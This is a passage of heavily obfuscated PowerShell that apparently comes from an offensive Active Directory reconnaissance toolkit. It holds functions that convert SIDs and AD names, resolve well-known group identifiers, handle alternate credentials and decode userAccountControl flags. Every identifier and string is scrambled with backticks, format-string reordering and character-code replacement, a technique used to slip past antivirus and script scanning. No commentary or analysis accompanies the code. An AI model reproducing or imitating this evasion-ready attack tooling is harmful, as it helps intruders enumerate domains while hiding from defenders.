                    ${DoMaiNSeA`Rch`Era`RGum`ENtS}[("{1}{0}"-f'y','Identit')] = ${US`e`RnaME}
                    ${DoMainS`eArch`ERa`RGU`mENTS}[("{1}{0}"-f 'main','Do')] = ${u`S`eRDom`AIn}
                    ${doMAi`Ns`E`Ar`Ch`ERaR`GUMEn`Ts}[("{0}{3}{1}{2}"-f'Pr','e','s','operti')] = ("{1}{0}{2}" -f'bject','o','sid')
                    &("{1}{4}{2}{0}{3}" -f'bje','Get-Do','O','ct','main') @DomainSearcherArguments | &("{2}{3}{4}{0}{1}"-f 'bje','ct','Sele','ct','-O') -Expand ("{0}{1}{2}"-f'obje','ct','sid')
                }
            }
            else {
                try {
                    if (${o`BJe`ct}.("{2}{1}{0}" -f 'ins','onta','C').Invoke('\')) {
                        ${D`Oma`IN} = ${o`BJe`Ct}.("{1}{0}" -f't','Spli').Invoke('\')[0]
                        ${o`Bje`CT} = ${O`Bj`EcT}.("{1}{0}"-f 'it','Spl').Invoke('\')[1]
                    }
                    elseif (-not ${p`sb`OuNdp`ArAM`Ete`Rs}[("{0}{1}"-f 'D','omain')]) {
                        ${dOmaI`NseArCH`erar`GUM`ENtS} = @{}
                        ${D`Oma`in} = (&("{2}{1}{0}" -f'omain','-D','Get') @DomainSearcherArguments)."na`Me"
                    }

                    ${O`Bj} = (&("{1}{0}{2}" -f'ec','New-Obj','t') ("{1}{0}{5}{6}{3}{2}{4}" -f 'y','S','Principal.NT','curity.','Account','ste','m.Se')(${D`O`MaIN}, ${O`B`jECt}))
                    ${o`BJ}."TR`A`NSlatE"([System.Security.Principal.SecurityIdentifier])."vA`lUe"
                }
                catch {
                    &("{0}{3}{1}{2}" -f'Write-V','b','ose','er') ('[Conve'+'r'+'tT'+'o-SI'+'D] '+'E'+'rror'+' '+'conv'+'erting'+' '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}


function cONV`ERT`FR`om-S`ID {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(maNDaTORY = ${tr`Ue}, vALUEfROMPipELInE = ${TR`UE}, vAlUEFROMPIpeliNebYPRopErTYNAMe = ${t`RUe})]
        [Alias('SID')]
        [ValidatePattern({"{1}{0}{2}"-f'S-1-','^','.*'})]
        [String[]]
        ${Obj`e`ctsId},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}" -f'nCon','Domai','tro','ller'})]
        [String]
        ${s`ErV`Er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RED`eNT`IAL} =   ${Q`Fn}::"em`pTY"
    )

    BEGIN {
        ${AdN`A`mEARgUmEN`Ts} = @{}
        if (${P`s`BOuNDpA`RAMe`TE`RS}[("{1}{0}"-f 'n','Domai')]) { ${AdnAmea`Rgu`MeN`Ts}[("{1}{0}"-f 'omain','D')] = ${D`O`MaiN} }
        if (${PsbOUNd`pa`R`AMetERs}[("{1}{0}" -f 'rver','Se')]) { ${ad`N`AMeaR`G`UmEnTS}[("{1}{0}" -f'erver','S')] = ${se`RVEr} }
        if (${pSbO`UN`DPARamETe`Rs}[("{2}{1}{0}"-f 'l','entia','Cred')]) { ${adNA`MeARguM`EN`Ts}[("{2}{1}{0}" -f 'al','i','Credent')] = ${cReD`en`TiaL} }
    }

    PROCESS {
        ForEach (${tarGeT`S`iD} in ${OB`Je`CtsiD}) {
            ${TA`R`GEt`Sid} = ${Ta`RGE`TSID}.("{0}{1}"-f'tri','m').Invoke('*')
            try {
                
                Switch (${TaR`g`etsiD}) {
                    ("{0}{1}" -f'S-','1-0')         { ("{1}{0}{2}{3}"-f 'l Au','Nul','th','ority') }
                    ("{2}{0}{1}"-f'-1-','0-0','S')       { ("{1}{0}"-f 'body','No') }
                    ("{0}{1}"-f 'S-','1-1')         { ("{1}{2}{0}{3}" -f 'rit','Worl','d Autho','y') }
                    ("{0}{2}{1}" -f'S-','-1-0','1')       { ("{1}{0}{2}"-f'yo','Ever','ne') }
                    ("{0}{1}"-f 'S-1','-2')         { ("{2}{1}{0}{3}" -f 'l A','oca','L','uthority') }
                    ("{2}{1}{0}"-f'0','-','S-1-2')       { ("{1}{0}" -f'al','Loc') }
                    ("{0}{1}{2}"-f 'S-1-','2','-1')       { ("{3}{2}{1}{4}{0}"-f 'on ','sole ','n','Co','Log') }
                    ("{1}{0}"-f '-3','S-1')         { ("{1}{2}{0}{3}"-f 'h','Creator ','Aut','ority') }
                    ("{1}{0}"-f '3-0','S-1-')       { ("{0}{1}{2}" -f 'Creator ','Owne','r') }
                    ("{2}{1}{0}"-f'1','-1-3-','S')       { ("{0}{1}{3}{2}" -f'Creator',' G','oup','r') }
                    ("{0}{1}" -f'S-1-','3-2')       { ("{4}{0}{1}{5}{3}{2}"-f 't','o','r','er Serve','Crea','r Own') }
                    ("{1}{0}"-f'1-3-3','S-')       { ("{2}{0}{4}{3}{1}"-f 'rou','er','Creator G','Serv','p ') }
                    ("{0}{1}{2}" -f'S-1-3','-','4')       { ("{0}{1}{2}" -f'Ow','ner ','Rights') }
                    ("{1}{0}" -f'4','S-1-')         { ("{4}{2}{5}{3}{1}{0}" -f'ty','ri','A','ho','Non-unique ','ut') }
                    ("{0}{1}" -f'S-1-','5')         { ("{2}{1}{0}"-f'ority','h','NT Aut') }
                    ("{0}{2}{1}"-f'S-','1','1-5-')       { ("{1}{0}"-f'p','Dialu') }
                    ("{0}{1}" -f'S-1-','5-2')       { ("{0}{2}{1}"-f'N','ork','etw') }
                    ("{2}{1}{0}"-f '3','5-','S-1-')       { ("{1}{0}" -f 'tch','Ba') }
                    ("{1}{0}"-f '-1-5-4','S')       { ("{1}{0}{2}{3}"-f 'nter','I','ac','tive') }
                    ("{0}{1}" -f 'S-1','-5-6')       { ("{1}{2}{0}" -f'e','Serv','ic') }
                    ("{0}{1}{2}" -f 'S-','1-5-','7')       { ("{0}{2}{1}{3}"-f'A','on','n','ymous') }
                    ("{1}{0}"-f'5-8','S-1-')       { ("{0}{1}" -f 'Pr','oxy') }
                    ("{1}{2}{0}" -f'-5-9','S-','1')       { ("{1}{3}{2}{6}{4}{7}{5}{0}"-f 'ers','Ent','o','erprise D','n Cont','l','mai','rol') }
                    ("{1}{0}" -f'-5-10','S-1')      { ("{4}{1}{0}{2}{3}" -f' S','rincipal','el','f','P') }
                    ("{2}{0}{1}"-f '1-5-','11','S-')      { ("{2}{0}{1}{3}" -f'henticated U','s','Aut','ers') }
                    ("{0}{2}{1}" -f'S','1-5-12','-')      { ("{2}{3}{1}{0}" -f 'Code','ted ','Rest','ric') }
                    ("{0}{1}"-f 'S-1','-5-13')      { ("{0}{1}{4}{3}{2}" -f 'Termi','nal Server','ers','Us',' ') }
                    ("{2}{1}{0}" -f'4','-1-5-1','S')      { ("{2}{6}{0}{4}{3}{1}{5}" -f 'ote Intera','ogo','Re','L','ctive ','n','m') }
                    ("{1}{0}{2}"-f '1-5','S-','-15')      { ("{5}{3}{1}{2}{4}{0}"-f ' ','aniz','atio','Org','n','This ') }
                    ("{0}{1}{2}" -f'S','-','1-5-17')      { ("{1}{3}{4}{0}{2}"-f 't','T','ion ','hi','s Organiza') }
                    ("{1}{0}{2}"-f '1','S-1-5-','8')      { ("{3}{0}{2}{1}" -f 'al ','ystem','S','Loc') }
                    ("{1}{0}{2}"-f'-1-','S','5-19')      { ("{1}{0}{2}" -f 'T A','N','uthority') }
                    ("{2}{1}{0}" -f'5-20','1-','S-')      { ("{3}{2}{0}{1}" -f' Auth','ority','T','N') }
                    ("{2}{0}{1}"-f'1','-5-80-0','S-')    { ("{1}{3}{4}{0}{2}" -f 'es','Al',' ','l Serv','ic') }
                    ("{2}{1}{0}" -f '44','1-5-32-5','S-')  { ((("{4}{5}{2}{3}{0}{1}" -f 'nistrat','ors','LT','INNHvAdmi','BU','I')) -RePlaCe ([Char]78+[Char]72+[Char]118),[Char]92) }
                    ("{2}{1}{0}{3}"-f '-32-5','-1-5','S','45')  { ((("{4}{2}{1}{0}{3}" -f 'r','Use','UILTIN7y3','s','B')) -rePlACe ([ChaR]55+[ChaR]121+[ChaR]51),[ChaR]92) }
                    ("{1}{0}{2}"-f '-32-5','S-1-5','46')  { ((("{1}{2}{0}{3}" -f'NKGue','BUILT','IN5','sts'))  -ReplaCE([CHaR]53+[CHaR]78+[CHaR]75),[CHaR]92) }
                    ("{0}{1}{2}" -f'S-1-5-32','-','547')  { ((("{0}{2}{1}{3}"-f'BUIL','e','TINsegPower Us','rs'))."rePL`ACe"(([CHar]115+[CHar]101+[CHar]103),'\')) }
                    ("{2}{0}{1}{3}"-f'-','1-','S','5-32-548')  { ((("{6}{4}{1}{5}{0}{7}{2}{3}"-f 'O','Accou','r','ators','IN9RX','nt ','BUILT','pe')).("{0}{1}"-f 'rePLA','cE').Invoke('9RX','\')) }
                    ("{1}{0}{3}{2}"-f'-5','S-1','549','-32-')  { ((("{2}{0}{1}{3}"-f' O','per','BUILTINyJQServer','ators'))-CReplaCe'yJQ',[char]92) }
                    ("{0}{1}{2}"-f 'S-1','-5-3','2-550')  { ((("{1}{3}{5}{2}{4}{0}"-f 'tors','BU','xWcPrin','ILTI','t Opera','N')).("{1}{0}"-f'Lace','rep').Invoke('xWc','\')) }
                    ("{3}{0}{1}{2}" -f'-','1-5-32-','551','S')  { ((("{2}{1}{3}{0}"-f'ators','0}Backu','BUILTIN{','p Oper'))  -f [cHaR]92) }
                    ("{1}{2}{3}{0}" -f '-32-552','S-','1','-5')  { ((("{4}{5}{1}{2}{0}{3}"-f'a','epli','c','tors','BUILT','IN{0}R')) -f[cHar]92) }
                    ("{1}{3}{0}{2}" -f'-55','S-1-','4','5-32')  { ((("{7}{9}{1}{4}{0}{2}{8}{6}{3}{10}{5}"-f ' 2','WP','0','om','re-Windows','ible Access','C','BU','00 ','ILTINi8','pat')).("{2}{1}{0}" -f 'ce','PlA','re').Invoke('i8W','\')) }
                    ("{1}{3}{2}{0}"-f'5','S','32-55','-1-5-')  { ((("{0}{2}{1}{3}{7}{6}{4}{5}{8}"-f'B','IL','U','T','e Deskt','op Us','t','INc8TRemo','ers'))  -CREplaCE([cHAr]99+[cHAr]56+[cHAr]84),[cHAr]92) }
                    ("{3}{2}{0}{1}"-f '-32-','556','-1-5','S')  { ((("{4}{2}{1}{5}{7}{0}{8}{3}{6}"-f'atio','t','{0}Ne','er','BUILTIN','work','ators',' Configur','n Op')) -F[cHaR]92) }
                    ("{0}{2}{1}"-f'S-','32-557','1-5-')  { ((("{0}{7}{6}{3}{8}{2}{4}{5}{1}"-f 'BUI','lders','Fo','ming','re','st Trust Bui','TIN{0}Inco','L',' ')) -F [ChAR]92) }
                    ("{3}{2}{0}{1}"-f'2-55','8','-3','S-1-5')  { ((("{1}{5}{0}{4}{10}{7}{6}{2}{9}{3}{8}"-f'N','BUILT','it','r ','h6e','I','rmance Mon','rfo','Users','o','Pe')).("{1}{0}{2}"-f 'LA','ReP','Ce').Invoke('h6e','\')) }
                    ("{1}{0}{2}"-f '2','S-1-5-3','-559')  { ((("{2}{1}{7}{5}{3}{6}{4}{8}{0}" -f'sers','ILTIN{','BU','rma','e ','o','nc','0}Perf','Log U'))  -F  [Char]92) }
                    ("{3}{2}{1}{0}"-f'-32-560','-5','-1','S')  { ((("{5}{10}{2}{3}{13}{12}{9}{6}{4}{7}{11}{8}{1}{0}" -f 'roup',' G','I','LT','Authorizatio','B','ws ','n Ac','ss','}Windo','U','ce','N{0','I'))  -F[CHaR]92) }
                    ("{0}{2}{1}{3}"-f'S','2-5','-1-5-3','61')  { ((("{0}{4}{5}{3}{2}{1}{6}"-f'BUILTIN','se Serv','ver Licen','nal Ser','I','gxTermi','ers'))."R`ePlAcE"(([ChaR]73+[ChaR]103+[ChaR]120),[string][ChaR]92)) }
                    ("{2}{0}{3}{1}" -f'1-5','62','S-','-32-5')  { ((("{3}{5}{8}{6}{0}{1}{9}{2}{4}{7}"-f'tribu','te','M','BUILT',' U','I','6vDis','sers','N8','d CO')).("{0}{1}"-f 'reP','LACe').Invoke('86v','\')) }
                    ("{3}{2}{1}{0}" -f '9','-56','-1-5-32','S')  { ((("{1}{5}{6}{3}{0}{4}{2}"-f 'O','BUILTIN{0}C','ators','ic ','per','ryp','tograph'))-f[CHAR]92) }
                    ("{2}{1}{0}" -f'3','-5-32-57','S-1')  { ((("{2}{5}{4}{6}{1}{0}{7}{3}"-f 'Even','dY','BU',' Readers','L','I','TINP','t Log'))."Rep`L`ACE"('PdY',[StRInG][cHAr]92)) }
                    ("{1}{3}{2}{0}" -f '4','S-1-5-3','57','2-')  { ((("{5}{8}{6}{4}{0}{3}{1}{7}{2}" -f 'COM','cc','ss',' A','D','BUILTIN{0}Cer','te Service ','e','tifica'))-F  [CHaR]92) }
                    ("{2}{1}{3}{0}"-f '5','1-5','S-','-32-57')  { ((("{0}{5}{1}{2}{3}{6}{7}{4}" -f 'BUIL','D','S Re','m',' Servers','TIN{0}R','ote',' Access'))-f  [chaR]92) }
                    ("{1}{0}{3}{2}" -f '-32','S-1-5','76','-5')  { ((("{5}{4}{1}{3}{8}{7}{6}{0}{2}"-f 'Serv','0}','ers','R','N{','BUILTI','nt ','S Endpoi','D'))-F[cHar]92) }
                    ("{1}{2}{0}"-f'-32-577','S-1','-5')  { ((("{3}{5}{0}{7}{8}{6}{2}{4}{1}"-f'IN3','s','ement','BU',' Server','ILT','anag','eC','RDS M'))."R`EPlA`Ce"(([cHar]51+[cHar]101+[cHar]67),[sTrIng][cHar]92)) }
                    ("{0}{2}{1}{3}"-f'S-1','-','-5-32','578')  { ((("{3}{2}{0}{5}{4}{1}" -f 'dmini','ors','er-V A','BUILTINjeOHyp','at','str')) -RePlacE  ([CHAR]106+[CHAR]101+[CHAR]79),[CHAR]92) }
                    ("{3}{2}{0}{1}" -f '32-','579','1-5-','S-')  { ((("{6}{2}{7}{5}{0}{9}{12}{10}{4}{11}{3}{1}{8}" -f 'o','e ','INB','nc','ssi',' C','BUILT','HVAccess','Operators','ntro',' A','sta','l'))-REpLaCE  'BHV',[chaR]92) }
                    ("{1}{0}{2}{3}" -f'-5-','S-1','3','2-580')  { ((("{10}{6}{3}{7}{1}{2}{8}{5}{4}{11}{0}{13}{12}{9}"-f'ta','ce','ss','N','rol As','Cont','TI','s7OAc',' ','ors','BUIL','sis','Operat','nce '))  -CReplAce's7O',[Char]92) }
                    Default {
                        &("{3}{1}{2}{0}" -f 'DName','-','A','Convert') -Identity ${TaRgE`T`s`Id} @ADNameArguments
                    }
                }
            }
            catch {
                &("{1}{0}{4}{3}{2}" -f'-Ve','Write','e','os','rb') ('['+'ConvertFrom-'+'S'+'I'+'D'+'] '+'Error'+' '+'co'+'nver'+'t'+'ing '+'S'+'ID '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function cOnVE`Rt-`AD`NAmE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{12}{6}{8}{9}{3}{2}{1}{10}{7}{11}{0}{4}{5}" -f 'u','orS','cessF','o','nctio','ns','Shou','eChanging','ld','Pr','tat','F','PSUse'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(maNdAtoRY = ${TR`UE}, VaLuefRoMpipeLINE = ${t`RUe}, valUEFrOMpiPElINEbYpRopERtyNAME = ${Tr`Ue})]
        [Alias({"{1}{0}" -f 'e','Nam'}, {"{2}{3}{0}{1}" -f'N','ame','Obj','ect'})]
        [String[]]
        ${IDE`N`Tity},

        [String]
        [ValidateSet('DN', {"{1}{2}{0}"-f'al','Canoni','c'}, 'NT4', {"{0}{1}{2}"-f 'Dis','pla','y'}, {"{2}{3}{0}{1}" -f'mp','le','DomainS','i'}, {"{0}{3}{1}{2}" -f'Enterpris','l','e','eSimp'}, {"{0}{1}" -f'GU','ID'}, {"{0}{1}" -f'Unkn','own'}, 'UPN', {"{2}{0}{1}"-f'c','alEx','Canoni'}, 'SPN')]
        ${OuTput`T`YPE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`m`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{4}{0}" -f 'er','om','ainControl','D','l'})]
        [String]
        ${sEr`VER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eDE`NTIaL} =   (LS  ("{0}{2}{1}" -f 'VAri','le:QFn','aB') )."val`Ue"::"E`mptY"
    )

    BEGIN {
        ${n`AMetYP`Es} = @{
            'DN'                =   1  
            ("{2}{0}{1}"-f'ic','al','Canon')         =   2  
            'NT4'               =   3  
            ("{0}{2}{1}" -f'D','y','ispla')           =   4  
            ("{2}{1}{0}{3}"-f 'nSimp','omai','D','le')      =   5  
            ("{4}{2}{0}{3}{1}"-f'erp','mple','nt','riseSi','E')  =   6  
            ("{0}{1}" -f'GU','ID')              =   7  
            ("{0}{2}{1}" -f'U','own','nkn')           =   8  
            'UPN'               =   9  
            ("{3}{2}{1}{0}" -f 'x','nonicalE','a','C')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function invo`k`E-m`EThOd([__ComObject] ${OB`je`ct}, [String] ${Met`H`od}, ${parAm`e`T`ers}) {
            ${O`Utput} = ${n`UlL}
            ${OuT`PUt} = ${o`BJEct}.("{1}{0}"-f'tType','Ge').Invoke().("{1}{0}{2}{3}" -f'ok','Inv','eMemb','er').Invoke(${meT`Hod}, ("{0}{1}{2}" -f 'Invo','keMe','thod'), ${nU`Ll}, ${Ob`jECt}, ${PAr`A`mETErS})
            &("{0}{2}{1}" -f'Write','put','-Out') ${o`UtPUt}
        }

        function G`et-pr`oP`eRTy([__ComObject] ${oBj`E`CT}, [String] ${PROP`E`RTy}) {
            ${o`BJE`Ct}.("{0}{1}" -f 'GetT','ype').Invoke().("{1}{0}{2}"-f 'mb','InvokeMe','er').Invoke(${p`RoPe`RTy}, ("{0}{1}{2}" -f 'GetP','ro','perty'), ${N`UlL}, ${O`BJEct}, ${N`ULl})
        }

        function SET-`p`RoPerty([__ComObject] ${OBJE`CT}, [String] ${prOpE`R`TY}, ${para`m`e`TErs}) {
            [Void] ${OBjE`cT}.("{0}{1}" -f'G','etType').Invoke().("{0}{3}{1}{2}" -f 'Inv','Membe','r','oke').Invoke(${P`ROpeR`Ty}, ("{0}{1}{2}" -f'SetPro','p','erty'), ${N`ULL}, ${oBj`ECt}, ${PAR`AmeT`e`RS})
        }

        
        if (${PSbOU`NDpaR`A`me`Ters}[("{1}{0}" -f'er','Serv')]) {
            ${adsi`N`It`TYpe} = 2
            ${InI`TnAMe} = ${S`E`RvER}
        }
        elseif (${P`sBoUND`p`ArAMete`Rs}[("{0}{2}{1}"-f 'Dom','n','ai')]) {
            ${aD`s`iNitt`ypE} = 1
            ${INi`TN`AmE} = ${doM`A`in}
        }
        elseif (${p`sbO`UNDPAram`e`TE`Rs}[("{2}{1}{0}"-f 'tial','en','Cred')]) {
            ${CR`Ed} = ${credE`NtI`AL}.("{1}{3}{0}{4}{2}" -f'n','GetNetwork','l','Crede','tia').Invoke()
            ${ADSi`N`ITtYPE} = 1
            ${ini`Tn`AMe} = ${cR`Ed}."d`om`AiN"
        }
        else {
            
            ${ADsi`NiT`TYpE} = 3
            ${In`ITN`AMe} = ${N`UlL}
        }
    }

    PROCESS {
        ForEach (${t`A`Rge`TIdE`Ntity} in ${i`De`NtiTy}) {
            if (-not ${Ps`BOU`NDP`ARAMEtErS}[("{1}{0}{2}" -f 'tTyp','Outpu','e')]) {
                if (${Ta`RGETIDE`N`TI`TY} -match ((("{4}{2}{6}{5}{3}{0}{1}"-f 'z ',']+',']+D1qD','-','^[A-Za-z','A-Za','1q[')) -CrEPLaCE([cHaR]68+[cHaR]49+[cHaR]113),[cHaR]92)) {
                    ${A`dSOuTpuTT`ypE} = ${n`AmEt`yPEs}[("{0}{1}{2}{3}"-f 'Do','main','S','imple')]
                }
                else {
                    ${a`DsO`UTPuT`TyPE} = ${n`AmetY`p`ES}['NT4']
                }
            }
            else {
                ${adSOuTp`Ut`Ty`pe} = ${nA`me`TYPES}[${OuTPUt`TY`pE}]
            }

            ${tRa`N`Sl`ATe} = &("{2}{0}{1}" -f'ew-','Object','N') -ComObject ("{0}{3}{1}{2}"-f 'NameTra','a','te','nsl')

            if (${pSB`OunDPaRa`mET`E`Rs}[("{2}{0}{1}"-f'rede','ntial','C')]) {
                try {
                    ${Cr`ED} = ${Cr`eD`ENTiaL}.("{3}{5}{1}{2}{4}{0}"-f'al','two','rkC','GetN','redenti','e').Invoke()

                    &("{2}{0}{1}"-f'-Met','hod','Invoke') ${tRA`N`slaTE} ("{1}{0}"-f'Ex','Init') (
                        ${A`DS`InItTyPe},
                        ${In`I`Tname},
                        ${c`RED}."USer`Na`Me",
                        ${c`REd}."dO`m`AiN",
                        ${cR`ED}."PA`SS`worD"
                    )
                }
                catch {
                    &("{1}{2}{0}{3}"-f 'bos','Writ','e-Ver','e') ('[Con'+'v'+'ert-ADNa'+'me]'+' '+'Er'+'ro'+'r '+'in'+'i'+'tializin'+'g '+'tr'+'ans'+'la'+'tion '+'fo'+'r '+"'$Identity' "+'using'+' '+'al'+'ternate'+' '+'cre'+'dent'+'ials '+': '+"$_")
                }
            }
            else {
                try {
                    ${nu`Ll} = &("{2}{0}{1}" -f'e-M','ethod','Invok') ${TR`ANS`lA`TE} ("{0}{1}"-f 'I','nit') (
                        ${aDSi`NI`TTyPE},
                        ${INi`TN`AmE}
                    )
                }
                catch {
                    &("{3}{2}{0}{1}" -f'r','bose','e-Ve','Writ') ('[Con'+'vert-ADN'+'a'+'m'+'e] '+'E'+'rr'+'or '+'in'+'itial'+'izing'+' '+'transl'+'a'+'t'+'ion '+'for'+' '+"'$Identity' "+': '+"$_")
                }
            }

            
            &("{2}{1}{3}{0}"-f 'y','o','Set-Pr','pert') ${T`RA`NSLa`Te} ("{2}{3}{1}{0}"-f'al','aseReferr','C','h') (0x60)

            try {
                
                ${nu`LL} = &("{2}{1}{0}"-f 'thod','e-Me','Invok') ${Tr`An`Sl`AtE} 'Set' (8, ${TA`RG`e`Tid`ENTIty})
                &("{0}{1}{2}" -f'I','nvok','e-Method') ${T`RANs`lA`Te} 'Get' (${A`dso`Utp`UtTYpE})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{2}{0}{1}" -f'i','te-Verbose','Wr') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function CONvERTFrO`m-UAcV`A`Lue {


    [OutputType({"{5}{6}{11}{10}{3}{2}{0}{7}{9}{1}{8}{4}{12}" -f 'S','d.Or','tions.','lec','Dictionar','Syste','m','p','dered','ecialize','l','.Co','y'})]
    [CmdletBinding()]
    Param(
        [Parameter(maNDATOry = ${T`Rue}, ValUefroMPipelINe = ${t`RUE}, VAluEFROMPIpElInebyPrOPErTYName = ${tr`Ue})]
        [Alias('UAC', {"{5}{0}{2}{3}{4}{1}"-f'u','l','n','tc','ontro','useracco'})]
        [Int]
        ${v`Al`UE},

        [Switch]
        ${S`h`owall}
    )

    BEGIN {
        
        ${u`ACV`AL`UeS} = &("{2}{1}{0}" -f'w-Object','e','N') ("{10}{4}{11}{6}{2}{8}{5}{1}{7}{0}{3}{9}"-f '.O','ia','c','rde','stem.C','ns.Spec','le','lized','tio','redDictionary','Sy','ol')
        ${u`AC`ValUES}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}" -f 'SCRIP','T'), 1)
        ${Ua`Cv`AL`UEs}.("{1}{0}" -f'd','Ad').Invoke(("{4}{0}{1}{2}{3}"-f'T','D','IS','ABLE','ACCOUN'), 2)
        ${UA`CVa`luES}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{2}{3}" -f'HOMEDI','R_RE','QU','IRED'), 8)
        ${u`A`CVALUEs}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f'LOCKO','UT'), 16)
        ${U`A`CvaLu`eS}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{0}{2}{1}" -f 'SWD','TREQD','_NO','PAS'), 32)
        ${uACv`AL`UeS}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{3}{5}{1}{4}{0}"-f'E','WD','P','AS','_CANT_CHANG','S'), 64)
        ${UAcVA`L`UeS}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{4}{3}{1}{0}"-f 'T_PWD_ALLOWED','D_TEX','E','CRYPTE','N'), 128)
        ${Ua`CVa`LU`eS}.("{0}{1}" -f'A','dd').Invoke(("{5}{4}{6}{3}{2}{1}{0}" -f 'COUNT','_AC','ICATE','UPL','MP_','TE','D'), 256)
        ${u`AcVa`Lu`es}.("{0}{1}"-f'Ad','d').Invoke(("{2}{3}{1}{4}{0}" -f 'UNT','L_','NOR','MA','ACCO'), 512)
        ${Uac`V`ALU`ES}.("{0}{1}" -f 'Ad','d').Invoke(("{5}{1}{3}{4}{2}{6}{7}{0}"-f 'NT','I','TRU','N','_','INTERDOMA','ST_AC','COU'), 2048)
        ${U`ACva`LUEs}.("{1}{0}" -f 'd','Ad').Invoke(("{4}{2}{0}{5}{6}{3}{1}"-f 'TATI','T','KS','N','WOR','O','N_TRUST_ACCOU'), 4096)
        ${uAc`Val`UES}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{0}{2}{1}"-f 'RU','_ACCOUNT','ST','SERVER_T'), 8192)
        ${u`ACvalU`ES}.("{0}{1}"-f'Ad','d').Invoke(("{3}{5}{4}{0}{1}{2}"-f 'S','SWO','RD','DO','IRE_PA','NT_EXP'), 65536)
        ${uac`V`AlUEs}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{3}{0}{4}{1}" -f 'LOG','ACCOUNT','MN','S_','ON_'), 131072)
        ${UaCV`ALU`Es}.("{1}{0}"-f 'dd','A').Invoke(("{5}{0}{3}{4}{1}{2}" -f 'AR','EQU','IRED','TCARD_','R','SM'), 262144)
        ${uAc`VA`LU`es}.("{1}{0}"-f'd','Ad').Invoke(("{3}{4}{0}{2}{1}"-f 'R_DE','ION','LEGAT','TRUS','TED_FO'), 524288)
        ${Uacval`U`es}.("{1}{0}"-f'dd','A').Invoke(("{2}{0}{3}{1}" -f 'T_DELEGAT','D','NO','E'), 1048576)
        ${u`AC`Va`lUeS}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{2}{0}{1}{4}"-f '_','O','DES_KEY','USE_','NLY'), 2097152)
        ${ua`cV`AlU`eS}.("{1}{0}"-f'dd','A').Invoke(("{2}{3}{4}{0}{1}"-f 'EA','UTH','DON','T_R','EQ_PR'), 4194304)
        ${ua`CVaL`UEs}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{0}{4}{2}"-f'D_E','R','ED','PASSWO','XPIR'), 8388608)
        ${UAcv`AlU`ES}.("{1}{0}"-f 'dd','A').Invoke(("{0}{5}{1}{4}{3}{2}" -f'TR','ED_T','GATION','FOR_DELE','O_AUTH_','UST'), 16777216)
        ${u`AC`V`AlUES}.("{1}{0}"-f 'dd','A').Invoke(("{2}{3}{0}{4}{1}"-f'_ACCO','T','PARTIAL_SECR','ETS','UN'), 67108864)
    }

    PROCESS {
        ${R`eSULt`Uac`VALU`ES} = &("{0}{1}{2}"-f 'Ne','w-','Object') ("{6}{1}{3}{2}{5}{7}{0}{4}"-f 'dDictionar','tem.Col','s.S','lection','y','pecial','Sys','ized.Ordere')

        if (${shoW`ALL}) {
            ForEach (${UaCV`Al`Ue} in ${Ua`cvA`Lues}.("{1}{2}{3}{0}"-f'erator','Ge','tE','num').Invoke()) {
                if ( (${VAL`Ue} -band ${uAC`VaLue}."v`ALUE") -eq ${U`Ac`V`Alue}."v`ALue") {
                    ${RE`S`U`lTUacVaLUES}.("{1}{0}" -f 'dd','A').Invoke(${u`Acv`Alue}."NA`me", "$($UACValue.Value)+")
                }
                else {
                    ${rESU`LTUac`VAL`UES}.("{1}{0}" -f'd','Ad').Invoke(${UaC`V`ALUE}."N`AMe", "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach (${u`Ac`ValUE} in ${U`A`CvalUeS}.("{0}{2}{1}"-f'GetEn','ator','umer').Invoke()) {
                if ( (${vAl`UE} -band ${u`AcvaL`UE}."VaL`Ue") -eq ${u`A`cv`ALUE}."va`lUE") {
                    ${rEs`UlTu`Ac`VALues}.("{0}{1}"-f 'A','dd').Invoke(${UAc`Va`LUe}."N`Ame", "$($UACValue.Value)")
                }
            }
        }
        ${r`ESUl`TUAcVAl`UEs}
    }
}


function GEt`-`Pr`inC`I`PaLcONTEXT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{4}{3}" -f'ou','P','SSh','ss','ldProce'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSItIoN = 0, MAnDaTOrY = ${T`RUe})]
        [Alias({"{2}{1}{0}" -f'me','roupNa','G'}, {"{3}{0}{1}{2}"-f 'pI','denti','ty','Grou'})]
        [String]
        ${IDeN`TITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`mAiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`eDe`NtIAL} =  (  lS  ("VaR"+"I"+"ABle:qF"+"n") )."v`ALue"::"eMP`Ty"
    )

    &("{0}{1}{2}"-f 'Ad','d-Ty','pe') -AssemblyName ("{8}{1}{9}{5}{6}{4}{3}{2}{7}{10}{0}"-f 't','to','em','tManag','oun','ices.','Acc','e','System.Direc','ryServ','n')

    try {
